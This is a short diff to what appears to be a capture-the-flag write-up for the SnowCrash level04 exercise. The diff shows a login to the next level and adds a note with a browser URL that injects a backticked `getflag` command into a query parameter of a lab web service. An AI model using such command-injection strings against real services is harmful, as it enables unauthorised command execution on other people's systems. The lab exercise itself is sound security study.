@@ -34,4 +34,6 @@ level04@SnowCrash:~$ su level05
 Password:
 level05@SnowCrash:~$
 ```  
-level04 passed !
+level04 passed !  
+  
+***Notes** : We can also tape on a navigator "http://10.11.200.76:4747/?x=\`getflag\`"*
